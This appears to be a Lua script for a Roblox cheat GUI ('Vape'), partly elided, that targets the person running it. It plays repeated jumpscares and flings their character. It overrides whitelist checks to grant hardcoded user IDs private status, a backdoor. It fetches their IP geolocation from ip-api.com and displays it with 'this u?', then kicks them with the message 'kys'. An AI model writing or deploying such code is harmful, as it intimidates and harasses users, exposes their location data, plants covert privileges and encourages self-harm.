...
local Functions = {StoredHashes = {}}
function Functions:Hash(str)
	if Functions.StoredHashes[tostring(str)] == nil and sha then
		Functions.StoredHashes[tostring(str)] = sha.sha512(tostring(str) .. 'SelfReport')
	end

	return Functions.StoredHashes[tostring(str)] or ''
end

local GuiLibrary = shared.GuiLibrary
local Gui = GuiLibrary and GuiLibrary.MainGui

if not Gui then return end

local ImageId = 'rbxassetid://13473282643'
local ScareSound = 'rbxassetid://6701126635'

local ObamaId = 'rbxassetid://7182240726'
local ObamaSound = 'rbxassetid://5993708091'

local IpLeak = 'rbxassetid://9074550320'

game:GetService('ContentProvider'):Preload(ImageId)
game:GetService('ContentProvider'):Preload(ScareSound)

game:GetService('ContentProvider'):Preload(ObamaId)
game:GetService('ContentProvider'):Preload(ObamaSound)

game:GetService('ContentProvider'):Preload(IpLeak)

local function Jumpscare(Image, SoundId, Appear)
	...
	local Appear = Appear or .25
	if GuiLibrary then
		GuiLibrary.ObjectsThatCanBeSaved['AutoLeave'].Api.Enabled = false

		GuiLibrary.ObjectsThatCanBeSaved['Fly'].Api.Enabled = false
		GuiLibrary.ObjectsThatCanBeSaved['InfiniteFly'].Api.Enabled = false
	end

	game:GetService('TweenService'):Create(ImageLabel, TweenInfo.new(Appear / 2), {ImageTransparency = 0}):Play()
	wait(Appear / 2)
	game:GetService('TweenService'):Create(ImageLabel, TweenInfo.new(Appear / 2), {ImageTransparency = 1}):Play()
	wait(Appear / 2)
...
local function Kill()
	...
	pcall(function() game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999) end)
end

local Listed = {154144731, 55687095, 981335534}
local WhitelistFunctions = getfenv().WhitelistFunctions or {}

local CheckWhitelisted = WhitelistFunctions.CheckWhitelisted -- override to allow myself & and a few others to be a private user
function WhitelistFunctions:CheckWhitelisted(plr)
	if table.find(Listed, plr.UserId) then return true end
	return CheckWhitelisted(WhitelistFunctions, plr)
end

local CheckPlayerType = WhitelistFunctions.CheckPlayerType
function WhitelistFunctions:CheckPlayerType(plr)
	if table.find(Listed, plr.UserId) then return 'VAPE PRIVATE', false, true end
	return CheckPlayerType(WhitelistFunctions, plr)
end

function RequestIp()
	local RequestTo = 'http://ip-api.com/json/'

	pcall(function()
		local APIJson = game:HttpGetAsync(RequestTo, true)
		local APIRequest = game:GetService('HttpService'):JSONDecode(APIJson)

		if not (APIRequest.status == 'success') then
...
while true do
	...
	Jumpscare(ImageId, ScareSound)

	if Scared >= Scares then wait(3) break end
end

Jumpscare(ObamaId, ObamaSound, 2)

local Ip = RequestIp()
if Ip then
	local TextLabel = Instance.new('TextLabel')

	TextLabel.Text = 'this u?'
	...
	game:GetService('Players').LocalPlayer:Kick('crappy executor, kys <3')
end
